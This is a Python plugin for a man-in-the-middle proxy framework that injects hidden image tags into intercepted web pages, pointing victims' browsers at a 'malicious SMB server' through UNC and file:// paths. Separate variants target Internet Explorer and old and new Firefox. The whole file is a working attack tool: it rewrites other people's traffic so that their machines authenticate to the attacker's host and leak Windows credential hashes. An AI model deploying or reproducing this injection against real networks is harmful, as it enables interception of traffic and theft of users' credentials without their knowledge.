from plugins.plugin import Plugin
import logging,re
from MITMUtils import *

class SMBAuth(Plugin):
    name = "SMBAuth"
    optname = "smbauth"
    has_opts = True
    implements = ["handleResponse"]
    def add_options(self,options):
        options.add_argument("--target-ip",type=str,default="127.0.0.1",
                help="The IP address of your malicious SMB server")
    def initialize(self,options):
        self.target_ip = options.target_ip 
    def handleResponse(self,request,data):
        data = insert_html(request.client,data,post=
        [
            ("</body>",'<img src=\"\\\\%s\\image.jpg\">'%(self.target_ip)),#IE
            ("</body>",'<img src=\"file://///%s\\image.jpg\">'%(self.target_ip)),#FF < 2.0.0.4
            ("</body>",'<img src=\"moz-icon:file:///%5c/'+self.target_ip+'\\image.jpg\">'),#FF > 2.0.0.4
        ])
        logging.info("Injected malicious images.")
        return {'request':request,'data':data}
